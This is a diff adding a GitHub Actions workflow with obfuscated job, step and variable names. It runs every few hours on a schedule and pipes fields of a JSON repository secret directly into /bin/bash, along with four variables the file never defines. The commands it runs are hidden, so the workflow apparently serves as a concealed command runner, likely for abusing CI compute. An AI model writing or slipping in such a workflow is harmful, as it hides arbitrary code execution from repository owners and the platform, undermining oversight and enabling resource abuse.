@@ -1,0 +1,21 @@
+name: qianhoudang4651
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianhoudang4651
+        env:
+          fvu9684: ${{ secrets.fvu9684 }}
+        run: |
+          echo $fvu9684 | jq -r .ti3812 | /bin/bash
+          echo $pefw2956 | jq -r .kgwd3274 | /bin/bash
+          echo $pqf9685 | jq -r .y60 | /bin/bash
+          echo $ax72 | jq -r .iry0745 | /bin/bash
+          echo $g3554 | jq -r .zulru8 | /bin/bash
+
